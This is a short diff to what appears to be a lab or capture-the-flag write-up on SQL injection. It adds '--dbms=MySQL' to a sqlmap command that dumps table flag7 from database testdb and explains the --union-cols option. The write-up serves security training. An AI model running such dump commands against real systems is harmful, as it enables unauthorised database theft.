@@ -75,7 +75,7 @@ sqlmap -r Case6.txt --batch --dump -T flag6 -D testdb --no-cast --level=5 --risk
 #### What's the contents of table flag7? (Case #7) - [UNION SQLi with adjustments]
 `We should verify that the number of columns in the UI is 5`
 ```
-sqlmap -r Case7.txt --batch --dump -T flag7 -D testdb --no-cast --level=5 --risk=3 --union-cols=5
+sqlmap -r Case7.txt --batch --dump -T flag7 -D testdb --no-cast --level=5 --risk=3 --union-cols=5 --dbms=MySQL
 ```
 - `--union-cols=5`: Specifies the number of columns to be used in a UNION query during the SQL injection exploitation. By setting this flag to 5, you are instructing sqlmap to assume that the vulnerable query returns 5 columns. This is important for constructing valid UNION queries, as both the original and injected queries must have the same number of columns to work correctly.
 
